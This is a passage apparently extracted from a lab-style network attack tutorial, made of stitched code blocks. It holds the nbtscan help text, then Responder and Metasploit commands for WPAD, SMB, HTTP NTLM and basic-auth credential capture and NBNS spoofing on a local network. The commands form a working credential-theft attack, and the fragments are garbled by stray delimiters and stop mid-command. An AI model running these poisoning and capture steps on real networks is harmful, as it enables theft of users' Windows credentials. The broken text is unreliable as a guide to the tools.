Copyright (C) 1999-2003 Alla Bezroutchko. \nThis is a free software and it comes with absolutely no warranty. \nYou can use, distribute and modify it under terms of GNU GPL. \n\nUsage: \nnbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(<scan_range>)  \n -v  verbose output. Print all names received \n   from each host \n -d  dump packets. Print whole packet contents. \n -e  Format output in /etc/hosts format. \n -l  Format output in lmhosts format. \n   Cannot be used with -v, -s or -h options. \n -t timeout wait timeout milliseconds for response. \n   Default 1000\\. \n -b bandwidth Output throttling. Slow down output \n   so that it uses no more that bandwidth bps. \n   Useful on slow links, so that outgoing queries \n   don't get dropped. \n -r  use local port 137 for scans. Win95 boxes \n   respond to this only. \n   You need to be root to use this option on Unix. \n -q  Suppress banners and error messages, \n -s separator Script-friendly output. Don't print \n   column and record headers, separate fields with separator. \n -h  Print human-readable names for services. \n   Can only be used with -v option. \n -m retransmits Number of retransmits. Default 0\\. \n -f filename Take IP addresses to scan from file filename. \n   -f - makes nbtscan take IP addresses from stdin. \n <scan_range> what to scan. Can either be single IP \n   like 192.168.1.1 or \n   range of addresses in one of two forms:  \n   xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx. \nExamples: \n nbtscan -r 192.168.1.0/24 \n  Scans the whole C-class network. \n nbtscan 192.168.1.25-137 \n  Scans a range from 192.168.1.25 to 192.168.1.137 \n nbtscan -v -s : 192.168.1.0/24 \n  Scans C-class network. Prints results in script-friendly \n  format using colon as field separator. \n  Produces output like that: \n  192.168.0.1:NT_SERVER:00U \n  192.168.0.1:MY_DOMAIN:00G \n  192.168.0.1:ADMINISTRATOR:03U \n  192.168.0.2:OTHER_BOX:00U \n  ... \n nbtscan -f iplist \n  Scans IP addresses specified in file iplist. \n```", "```\nresponder -help  \n```", "```\nresponder -I wlan0 -w -F --lm -b -r -d LAB1  \n```", "```\nmsfdb start # This will start the database.\nmsfconsole # This will start the console.  \n```", "```\nuse auxiliary/server/wpad # This set up the wpad module for use.\nshow options # This will show the options.  \n```", "```\nset SRVHOST 172.16.42.139\n```", "```\n    run -j # The -j flag will run the job in the background.\n\n```", "```\nuse auxiliary/server/capture/smb\nshow options  \n```", "```\nset SRVHOST 172.16.42.139\nrun -j # Again this will run the job in the background\n```", "```\nuse auxiliary/server/capture/http_ntlm\nshow options  \n```", "```\nset SRVHOST 172.16.42.139  \n```", "```\nset SRVPORT 443 # Set to local service port to 443\nset SSL true # This sets a self-signed cert to the port.\nset JOHNPWFILE john-cap.txt # This will set an output file.\nrun -j # Again this will run the job in the background\n```", "```\nuse auxiliary/server/capture/http_basic\nshow options  \n```", "```\nset SRVPORT 443 # Set to local service port to 443\nset SSL true # This sets a self-signed cert to the port.\nset SRVHOST 172.16.42.139\nrun -j # Again this will run the job in the background\njobs # Below we see the three running jobs.  \n```", "```\nuse auxiliary/spoof/nbns/nbns_response\nset INTERFACE wlan0 # your local network interface.
